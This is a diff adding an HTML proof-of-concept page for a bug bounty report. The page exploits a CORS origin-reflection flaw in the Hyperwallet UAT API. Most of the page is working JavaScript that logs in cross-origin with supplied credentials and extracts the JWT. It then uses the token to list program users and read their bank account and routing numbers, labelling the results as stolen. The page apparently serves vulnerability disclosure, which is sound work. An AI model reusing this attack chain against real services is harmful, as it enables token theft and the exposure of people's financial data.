@@ -1,21 +1,289 @@
-  <html>
+ <!DOCTYPE html>                                                   
+  <html lang="en">                                                                                                                                                   
+  <head>
+  <meta charset="UTF-8">                                                                                                                                             
+  <title>Hyperwallet CORS PoC — CWE-942</title>
+  <style>                                                                                                                                                            
+    *{box-sizing:border-box}                                                                                                                                         
+    body{font-family:Arial,sans-serif;max-width:800px;margin:40px auto;background:#f0f2f5;padding:0 16px}                                                            
+    .card{background:#fff;border:1px solid #ddd;border-radius:8px;padding:24px;margin:16px 0;box-shadow:0 1px 4px rgba(0,0,0,.08)}                                   
+    h1{color:#c0392b;margin-top:0}                                                                                                                                   
+    h2{color:#2c3e50;border-bottom:1px solid #eee;padding-bottom:8px;margin-top:0}                                                                                   
+    input{display:block;width:100%;padding:9px 12px;margin:6px 0 12px;border:1px solid #ccc;border-radius:4px;font-size:14px}                                        
+    button{background:#c0392b;color:#fff;padding:11px 28px;border:none;border-radius:4px;cursor:pointer;font-size:14px;font-weight:bold}                             
+    button:hover{background:#a93226}                                                                                                                                 
+    button:disabled{background:#95a5a6;cursor:default}                                                                                                               
+    pre{background:#1e272e;color:#d2dae2;padding:16px;border-radius:6px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;font-size:12px;line-height:1.5}    
+    .badge{display:inline-block;padding:4px 12px;border-radius:14px;font-size:12px;font-weight:bold;margin:4px 2px}                                                  
+    .red{background:#e74c3c;color:#fff}                                                                                                                              
+    .green{background:#27ae60;color:#fff}                                                                                                                            
+    .yellow{background:#f39c12;color:#fff}                                                                                                                           
+    .step{border-left:3px solid #c0392b;padding:8px 16px;margin:12px 0;background:#fdf7f7}                                                                           
+    .step.ok{border-color:#27ae60;background:#f0faf4}                                                                                                                
+    .meta{font-size:12px;color:#7f8c8d;margin:4px 0}                                                                                                                 
+    table{width:100%;border-collapse:collapse;font-size:13px;margin-top:8px}                                                                                         
+    th{background:#2c3e50;color:#fff;padding:8px 12px;text-align:left}                                                                                               
+    td{padding:7px 12px;border-bottom:1px solid #eee;font-family:monospace}                                                                                          
+    tr:hover td{background:#f8f9fa}                                                                                                                                  
+    .spinner{display:none;margin:8px 0;color:#7f8c8d;font-style:italic}                                                                                              
+    #log{max-height:220px;overflow-y:auto}                                                                                                                           
+  </style>                                                                                                                                                           
+  </head>                                                                                                                                                            
   <body>                                                                                                                                                             
-  <pre id="out">Loading...</pre>                                                                                                                                     
-  <script>
-  fetch('https://uat-api.paylution.com/rest/internal/v1/jwts', {                                                                                                     
-    method: 'GET',                                                                                                                                                   
-    credentials: 'include',                                                                                                                                          
-    headers: {                                                                                                                                                       
-      'Accept': 'application/json'                                                                                                                                   
+                  
+  <h1>Bug Bounty PoC — CORS Misconfiguration</h1>                                                                                                                    
+  <p class="meta">
+    <strong>Program:</strong> HackerOne — PayPal (switchblade01) &nbsp;|&nbsp;                                                                                       
+    <strong>CWE:</strong> CWE-942 &nbsp;|&nbsp;                                                                                                                      
+    <strong>Attacker origin:</strong> <code id="myOrigin"></code>                                                                                                    
+  </p>                                                                                                                                                               
+                                                                                                                                                                     
+  <div class="card">                                                                                                                                                 
+    <h2>Vulnerability</h2>
+    <p>                                                                                                                                                              
+      <code>uat-api.paylution.com</code> reflects <em>any</em> <code>Origin</code> header with                                                                       
+      <code>Access-Control-Allow-Credentials: true</code> on all responses, including                                                                                
+      <code>POST /rest/internal/v1/jwts</code> (the login endpoint).                                                                                                 
+      A malicious page on any origin can POST credentials cross-origin, read the JWT,                                                                                
+      and access all merchant resources — users, bank accounts, and transfers.                                                                                       
+    </p>                                                                                                                                                             
+    <p class="meta">                                                                                                                                                 
+      <strong>Confirmed response headers (even on 401):</strong><br>                                                                                                 
+      <code>Access-Control-Allow-Origin: https://sufyan-aslam.github.io</code><br>                                                                                   
+      <code>Access-Control-Allow-Credentials: true</code>                                                                                                            
+    </p>                                                                                                                                                             
+  </div>                                                                                                                                                             
+                                                                                                                                                                     
+  <div class="card">
+    <h2>Live Demo — 4-Step Attack Chain</h2>
+    <p>                                                                                                                                                              
+      Enter Hyperwallet UAT credentials. This page (<em>different origin</em> from
+      <code>uat-api.paylution.com</code>) will login cross-origin, steal the JWT,                                                                                    
+      enumerate your users, and read bank account details.                                                                                                           
+    </p>                                                                                                                                                             
+    <label style="font-weight:bold;font-size:13px;color:#555">Issuer (account number — digits only, no IM prefix)</label>                                            
+    <input id="issuer" placeholder="e.g. 287721141615">                                                                                                              
+    <label style="font-weight:bold;font-size:13px;color:#555">Username</label>                                                                                       
+    <input id="username" placeholder="e.g. jhonlara">                                                                                                                
+    <label style="font-weight:bold;font-size:13px;color:#555">Password</label>                                                                                       
+    <input id="password" type="password" placeholder="UAT password">                                                                                                 
+    <br>                                                                                                                                                             
+    <button id="btn" onclick="runPoC()">Run CORS Exploit</button>
+    <p class="spinner" id="spinner">Exploiting...</p>                                                                                                                
+  </div>          
+                                                                                                                                                                     
+  <div class="card" id="results" style="display:none">                                                                                                               
+    <h2>Attack Results</h2>
+    <div id="step1"></div>                                                                                                                                           
+    <div id="step2"></div>                                                                                                                                           
+    <div id="step3"></div>
+    <div id="step4"></div>                                                                                                                                           
+    <div id="log-container" style="display:none">
+      <h3 style="font-size:13px;color:#7f8c8d;margin:16px 0 4px">Raw API responses</h3>                                                                              
+      <pre id="log"></pre>                                                                                                                                           
+    </div>                                                                                                                                                           
+  </div>                                                                                                                                                             
+                                                                                                                                                                     
+  <script>        
+  document.getElementById("myOrigin").textContent = location.origin;
+                                                                                                                                                                     
+  const BASE = "https://uat-api.paylution.com";
+                                                                                                                                                                     
+  function log(msg) {                                                                                                                                                
+    document.getElementById("log").textContent += msg + "\n";
+    document.getElementById("log-container").style.display = "block";                                                                                                
+  }               
+
+  function badge(cls, txt) { return '<span class="badge '+cls+'">'+txt+'</span>'; }                                                                                  
+   
+  function step(id, html, cls) {                                                                                                                                     
+    document.getElementById(id).innerHTML = '<div class="step '+(cls||'")>'+html+'</div>';
+  }                                                                                                                                                                  
+                  
+  async function runPoC() {                                                                                                                                          
+    document.getElementById("results").style.display = "block";
+    document.getElementById("log").textContent = "";
+    document.getElementById("btn").disabled = true;                                                                                                                  
+    document.getElementById("spinner").style.display = "block";
+    ["step1","step2","step3","step4"].forEach(function(id){ document.getElementById(id).innerHTML=""; });                                                            
+                                                                                                                                                                     
+    var issuer   = document.getElementById("issuer").value.trim();                                                                                                   
+    var username = document.getElementById("username").value.trim();                                                                                                 
+    var password = document.getElementById("password").value;                                                                                                        
+                                                                                                                                                                     
+    // ── STEP 1: POST credentials cross-origin ──                                                                                                                   
+    step("step1","<b>Step 1:</b> POSTing credentials from <code>"+location.origin+"</code> to <code>"+BASE+"/rest/internal/v1/jwts</code>...");                      
+                                                                                                                                                                     
+    var resp, data;                                                                                                                                                  
+    try {                                                                                                                                                            
+      resp = await fetch(BASE+"/rest/internal/v1/jwts?returnConfigs=tutorialProgramToken", {                                                                         
+        method: "POST",                                                                                                                                              
+        credentials: "include",
+        headers: { "Content-Type": "application/json", "Accept": "application/json" },                                                                               
+        body: JSON.stringify({ issuer: issuer, username: username, password: password })                                                                             
+      });                                                                                                                                                            
+      data = await resp.json();                                                                                                                                      
+    } catch(e) {                                                                                                                                                     
+      step("step1", badge("green","BLOCKED")+" Browser blocked the cross-origin read: <code>"+e+"</code>", "ok");
+      return finish();                                                                                                                                               
+    }
+                                                                                                                                                                     
+    var acao = resp.headers.get("access-control-allow-origin");                                                                                                      
+    var acac = resp.headers.get("access-control-allow-credentials");
+    log("POST /rest/internal/v1/jwts → HTTP "+resp.status);                                                                                                          
+    log("access-control-allow-origin: "+acao);                                                                                                                       
+    log("access-control-allow-credentials: "+acac);                                                                                                                  
+    log(JSON.stringify(data,null,2));                                                                                                                                
+                                                                                                                                                                     
+    step("step1",                                                                                                                                                    
+      "<b>Step 1:</b> Cross-origin login POST<br>"+
+      badge("red","VULNERABLE")+" Response readable by attacker origin!<br>"+                                                                                        
+      "<pre>HTTP Status                     : "+resp.status+"\n"+                                                                                                    
+      "access-control-allow-origin    : "+acao+"\n"+                                                                                                                 
+      "access-control-allow-credentials: "+acac+"\n\n"+                                                                                                              
+      "Origin ["+location.origin+"] was reflected.\n"+                                                                                                               
+      "Any website can read this API response.</pre>"                                                                                                                
+    );                                                                                                                                                               
+                                                                                                                                                                     
+    // ── STEP 2: Extract JWT + programToken ──                                                                                                                      
+    var jwt = data.token || null;
+    var programToken = null;                                                                                                                                         
+                  
+    // Parse programToken from configs (object or array)                                                                                                             
+    var configs = data.configs || data.programConfigs || null;
+    if (configs) {                                                                                                                                                   
+      if (Array.isArray(configs)) {
+        var c = configs.find(function(x){ return x && x.programToken; });                                                                                            
+        if (c) programToken = c.programToken;                                                                                                                        
+      } else if (typeof configs === "object") {
+        // configs may be { "tutorialProgramToken": { programToken: "prg-..." } }                                                                                    
+        Object.values(configs).forEach(function(v){                                                                                                                  
+          if (v && v.programToken && !programToken) programToken = v.programToken;                                                                                   
+        });                                                                                                                                                          
+        if (!programToken && configs.programToken) programToken = configs.programToken;                                                                              
+      }                                                                                                                                                              
+    }
+                                                                                                                                                                     
+    if (!jwt) {                                                                                                                                                      
+      var errMsg = (data.errors&&data.errors[0]) ? data.errors[0].message : JSON.stringify(data);
+      step("step2",                                                                                                                                                  
+        "<b>Step 2:</b> JWT extraction<br>"+
+        badge("yellow","AUTH FAILED")+" Credentials rejected — but CORS reflection is proven in Step 1.<br>"+                                                        
+        "<pre>"+errMsg+"</pre>"+                                                                                                                                     
+        "<p style='color:#7f8c8d;font-size:13px'>Enter valid UAT credentials to complete the full demo.</p>"                                                         
+      );                                                                                                                                                             
+      return finish();                                                                                                                                               
     }                                                                                                                                                                
-  })              
-  .then(r => r.json())
-  .then(data => {
-    document.getElementById("out").innerText = JSON.stringify(data, null, 2);
-  })                                                                                                                                                                 
-  .catch(e => {
-    document.getElementById("out").innerText = "Error: " + e;                                                                                                        
-  });             
+                                                                                                                                                                     
+    var jwtP = {};                                                                                                                                                   
+    try { jwtP = JSON.parse(atob(jwt.split(".")[1].replace(/-/g,"+").replace(/_/g,"/"))); } catch(e){}
+    if (!programToken && jwtP.iss) programToken = jwtP.iss;                                                                                                          
+                                                                                                                                                                     
+    log("\nJWT claims: "+JSON.stringify(jwtP,null,2));                                                                                                               
+    log("programToken: "+programToken);                                                                                                                              
+                                                                                                                                                                     
+    step("step2", 
+      "<b>Step 2:</b> JWT stolen from cross-origin response<br>"+
+      badge("red","JWT STOLEN — FULL API ACCESS GRANTED")+"<br>"+                                                                                                    
+      "<pre>"+                                                                                                                                                       
+      "userToken  : "+(jwtP.sub||"—")+"\n"+                                                                                                                          
+      "programToken: "+(programToken||"—")+"\n"+                                                                                                                     
+      "Expires    : "+(jwtP.exp?new Date(jwtP.exp*1000).toISOString():"—")+"\n"+
+      "Roles      : "+JSON.stringify(jwtP.roles||[])+"\n\n"+                                                                                                         
+      "Bearer token: "+jwt.substring(0,90)+"..."+                                                                                                                    
+      "</pre>"                                                                                                                                                       
+    );                                                                                                                                                               
+                                                                                                                                                                     
+    // ── STEP 3: Enumerate users ──
+    step("step3","<b>Step 3:</b> Enumerating users in program <code>"+programToken+"</code>...");
+    var users = [];                                                                                                                                                  
+    try {                                                                                                                                                            
+      var uR = await fetch(BASE+"/rest/v4/programs/"+encodeURIComponent(programToken)+"/users?limit=10", {                                                           
+        credentials: "include",                                                                                                                                      
+        headers: { "Authorization":"Bearer "+jwt, "Accept":"application/json" }
+      });                                                                                                                                                            
+      var uD = await uR.json();
+      log("\nGET .../users → HTTP "+uR.status+"\n"+JSON.stringify(uD,null,2));                                                                                       
+      users = uD.data || uD.users || [];                                                                                                                             
+   
+      var rows = users.map(function(u){                                                                                                                              
+        return "<tr>"+
+          "<td>"+(u.token||"—")+"</td>"+                                                                                                                             
+          "<td>"+(u.email||u.clientUserId||"—")+"</td>"+
+          "<td>"+[(u.firstName||""),(u.lastName||"")].join(" ").trim()+"</td>"+                                                                                      
+          "<td>"+(u.status||"—")+"</td>"+                                                                                                                            
+        "</tr>";                                                                                                                                                     
+      }).join("");                                                                                                                                                   
+                  
+      step("step3",
+        "<b>Step 3:</b> Users enumerated<br>"+
+        badge("red", users.length+" USER(S) EXPOSED")+"<br>"+                                                                                                        
+        "<table><thead><tr><th>userToken</th><th>Email</th><th>Name</th><th>Status</th></tr></thead><tbody>"+                                                        
+        (rows||"<tr><td colspan='4' style='color:#7f8c8d'>No users returned</td></tr>")+                                                                             
+        "</tbody></table>"                                                                                                                                           
+      );                                                                                                                                                             
+    } catch(e) {                                                                                                                                                     
+      step("step3","<b>Step 3:</b> User enumeration<br>"+badge("yellow","ERROR")+" "+e,"ok");
+    }                                                                                                                                                                
+   
+    // ── STEP 4: Steal bank accounts ──                                                                                                                             
+    var userToken = jwtP.sub || (users[0]&&users[0].token) || null;
+    if (!userToken) {                                                                                                                                                
+      step("step4","<b>Step 4:</b> Bank accounts<br>"+badge("yellow","SKIPPED")+" No userToken to query.");                                                          
+      return finish();                                                                                                                                               
+    }                                                                                                                                                                
+                                                                                                                                                                     
+    step("step4","<b>Step 4:</b> Fetching bank accounts for user <code>"+userToken+"</code>...");                                                                    
+    try {
+      var bR = await fetch(                                                                                                                                          
+        BASE+"/rest/v4/programs/"+encodeURIComponent(programToken)+
+             "/users/"+encodeURIComponent(userToken)+"/bank-accounts",                                                                                               
+        {                                                                                                                                                            
+          credentials: "include",                                                                                                                                    
+          headers: { "Authorization":"Bearer "+jwt, "Accept":"application/json" }                                                                                    
+        }         
+      );
+      var bD = await bR.json();
+      log("\nGET .../bank-accounts → HTTP "+bR.status+"\n"+JSON.stringify(bD,null,2));                                                                               
+   
+      var accts = bD.data || [];                                                                                                                                     
+      var aRows = accts.map(function(a){
+        return "<tr>"+                                                                                                                                               
+          "<td>"+(a.token||"—")+"</td>"+
+          "<td>"+(a.bankAccountId||a.bankId||"—")+"</td>"+                                                                                                           
+          "<td>"+(a.branchId||a.routingNumber||"—")+"</td>"+
+          "<td>"+(a.bankName||"—")+"</td>"+                                                                                                                          
+          "<td>"+(a.transferMethodCountry||"—")+"</td>"+                                                                                                             
+          "<td>"+(a.status||"—")+"</td>"+                                                                                                                            
+        "</tr>";                                                                                                                                                     
+      }).join("");                                                                                                                                                   
+                  
+      step("step4",
+        "<b>Step 4:</b> Bank accounts exfiltrated cross-origin<br>"+
+        badge("red","CRITICAL — BANK ACCOUNTS STOLEN")+"<br>"+                                                                                                       
+        "<table><thead><tr>"+
+          "<th>Token</th><th>Account Number</th><th>Routing / Branch</th>"+                                                                                          
+          "<th>Bank</th><th>Country</th><th>Status</th>"+                                                                                                            
+        "</tr></thead><tbody>"+                                                                                                                                      
+        (aRows||"<tr><td colspan='6' style='color:#7f8c8d'>No bank accounts on record</td></tr>")+                                                                   
+        "</tbody></table><br>"+                                                                                                                                      
+        "<pre>"+JSON.stringify(bD,null,2)+"</pre>"+
+        "<p>"+badge("red","IMPACT")+                                                                                                                                 
+        " Full bank account details (account number, routing number, bank, country) read from <code>"+                                                               
+        location.origin+"</code> — a completely different origin. Possible because the server reflects "+                                                            
+        "<em>any</em> Origin with <code>Access-Control-Allow-Credentials: true</code>.</p>"                                                                          
+      );                                                                                                                                                             
+    } catch(e) {  
+      step("step4","<b>Step 4:</b> Bank accounts<br>"+badge("yellow","ERROR")+" "+e);                                                                                
+    }                                                                                                                                                                
+   
+    finish();                                                                                                                                                        
+  }               
+
+  function finish() {
+    document.getElementById("btn").disabled = false;
+    document.getElementById("spinner").style.display = "none";
+  }                                                                                                                                                                  
   </script>
   </body>                                                                                                                                                            
-  </html>
+  </html>  
